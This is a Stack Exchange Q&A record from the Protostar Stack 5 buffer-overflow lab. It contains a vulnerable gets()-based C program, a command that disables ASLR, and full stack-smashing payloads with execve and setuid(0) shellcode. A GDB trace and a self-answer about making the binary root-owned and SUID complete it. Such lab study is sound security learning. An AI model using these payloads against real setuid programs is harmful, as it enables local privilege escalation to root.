{
  "title": "Why SUID Shellcode not working but Basic Shellcode working?",
  "link": "https://reverseengineering.stackexchange.com/questions/18558/why-suid-shellcode-not-working-but-basic-shellcode-working",
  "content": "I'm playing with Basic Buffer Overflow Protostar - Stack 5\n\n```\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <string.h>\n\n//gcc -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -g bof2.c -o bof2\n//sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'\n\n\nint main(int argc, char **argv)\n{\n  char buffer[64];\n\n  gets(buffer);\n}\n\n```\nThen I try simple shellcode http://shell-storm.org/shellcode/files/shellcode-811.php\n\nSo final payload looks like this \n\n```\n(python -c \"print 'A'*72+'\\xf4\\xd1\\xff\\xff'+'\\x90'*200+'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'\"; tee) | ./protostar-stack5\n\n```\nIt works like expected, so when I type id in STDIN then STDOUT will be my current id and so on.\n\nNow I want to try shellcode with SETUID(0) here is the link http://shell-storm.org/shellcode/files/shellcode-598.php\n\nso my final payload will be \n\n```\n(python -c \"print 'A'*72+'\\xf4\\xd1\\xff\\xff'+'\\x90'*200+'\\x31\\xdb\\x8d\\x43\\x17\\xcd\\x80\\x53\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80'\"; tee) | ./protostar-stack5\n\n```\nWhen I type id in STDIN I got Segmentation Fault\n\nSo I decide to check by step into from NOP to Shellcode inside GDB\n\n```\n   0xffffd235:  nop\n   0xffffd236:  nop\n   0xffffd237:  nop\n=> 0xffffd238:  xor    ebx,ebx ; Start of Shellcode\n   0xffffd23a:  lea    eax,[ebx+0x17]\n   0xffffd23d:  int    0x80\n   0xffffd23f:  push   ebx\n   0xffffd240:  push   0x68732f6e\n   0xffffd245:  push   0x69622f2f\n   0xffffd24a:  mov    ebx,esp\n   0xffffd24c:  push   eax\n   0xffffd24d:  push   ebx\n   0xffffd24e:  mov    ecx,esp\n   0xffffd250:  cdq    \n   0xffffd251:  mov    al,0xb\n=> 0xffffd253:  int    0x80  ; End Of Shellcode\n   0xffffd255:  add    bh,bh ; Still executed\n   0xffffd257:  dec    DWORD PTR [ebx-0x25] ; Still executed\n   0xffffd25a:  (bad)  ; Still executed, this cause Segmentation fault\n   0xffffd25b:  jmp    DWORD PTR [edx-0x25]\n   0xffffd25e:  (bad)  \n   0xffffd25f:  push   DWORD PTR [ebx+ebx*8-0x1]\n\nLegend: code, data, rodata, value\nStopped reason: SIGILL\n0xffffd25a in ?? ()\n\n```\nI step into from start of shellcode till the end of shellcode, I got no error but shell doesn't appear and it still execute instruction after the end of shellcode then it will be Segmentation Fault in the end\n\nI have already set SUID Bit in compiled program.\n\nSo Why I got Segmentation Fault instead of executing shell?\n\nWhy instruction after INT 80 still executed, it's different with basic shellcode which give me shell after INT 80 executed?  \n\nWhat should I do to make my payload which containt SETUID(0) work like expected?\n\nPS : I Want to ask it, fortunately it work by the end of writing question. Any other answer is welcome.\n\nThanks in advance. \n\n",
  "votes": "2",
  "answers": 1,
  "views": "763",
  "tags": [
    "buffer-overflow"
  ],
  "user": "Dark Cyber",
  "time": "Jun 19, 2018 at 10:36",
  "comments": [],
  "answers_data": [
    {
      "content": "Don't forget to set compiled program owner as root sudo chown root ./filename and don't forget to set SUID bit chmod u+s ./filename, because your payload contain SETUID(0)\n\n",
      "votes": "1",
      "user": "Dark Cyber",
      "time": "Jun 19, 2018 at 10:36",
      "is_accepted": true,
      "comments": []
    }
  ]
}